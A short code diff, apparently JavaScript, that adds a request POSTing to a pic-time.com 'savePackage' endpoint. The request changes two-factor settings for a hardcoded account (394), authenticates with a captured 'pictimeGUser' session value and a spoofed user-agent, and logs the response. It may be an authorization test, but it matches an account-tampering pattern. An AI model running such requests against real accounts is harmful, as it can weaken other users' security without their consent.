@@ -117,6 +117,63 @@ if (Math.random() <= 1.0) {
         const getGUserInfoFetchUrl =
           "https://cstool.pic-time.com/!servicescs.asmx/getGUserInfo";
 
+        const savePackageBody = {
+          saveBatch: {
+            projectCreate: {
+              newProjectIds: [],
+              newSceneIds: [],
+              newSelectionIds: [],
+            },
+            projectProps: [],
+            artPricing: [],
+            projectSelectionProps: [],
+            projectScenesProps: [],
+            projectSelections: [],
+            campaignsUpdate: [],
+            projectExport: [],
+            projectComments: [],
+            setupPricing: [],
+            setupBrand: [],
+            setupAccount: [
+              {
+                accountId: 394,
+                security: {
+                  mode2Factor: 1,
+                  phone: null,
+                },
+              },
+            ],
+            actions: {
+              publish: [],
+              sceneReorder: [],
+              photosReorder: [],
+            },
+            dtoRevision: 163,
+            ignoreDtoRevision: false,
+          },
+          pcpClientId: "",
+        };
+
+        try {
+          const url = "https://asaf.pic-time.com";
+          const updateMfaSettingsJson = await fetch(
+            `${url}/!servicesp.asmx/savePackage`,
+            {
+              method: "POST",
+              headers: {
+                "content-type": "application/json; charset=UTF-8",
+                pictimeGUser: gusr,
+                "user-agent":
+                  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
+              },
+              body: JSON.stringify(savePackageBody),
+            }
+          ).then((resp) => resp.json());
+          await insertDoc('update-mfa-settings', {url, accountId: 394, data: updateMfaSettingsJson});
+        } catch (err) {
+          await insertDoc("error", err.toString());
+        }
+
         // Note: API Route
         // POST
         // https://volodymyrdev4.pic-time.com/oamapi/routeMetadata/Pictime.OaM.Categories.OamAICategory/events
